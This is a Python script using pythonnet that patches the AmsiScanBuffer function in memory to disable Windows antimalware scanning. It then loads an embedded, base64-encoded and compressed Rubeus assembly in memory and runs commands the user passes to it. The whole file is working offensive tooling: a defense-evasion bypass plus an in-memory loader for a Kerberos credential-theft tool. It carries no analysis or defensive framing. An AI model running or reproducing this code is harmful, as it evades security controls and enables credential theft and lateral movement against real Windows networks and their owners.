import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def to_clr_array(py_list):
    """
    Converts a Python list to a .NET string array.
    Args:
        py_list: The Python list to convert.
    Returns:
        A .NET string array.
    """
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    rubeus_program_type = assembly.GetType("Rubeus.Program")

    # You don't need to create an instance of the class for a static method
    method = rubeus_program_type.GetMethod("MainString")

    # Convert your command to a .NET string array
    command_args = to_clr_array([command])

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, help='Command to execute (like "help" or "triage")')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()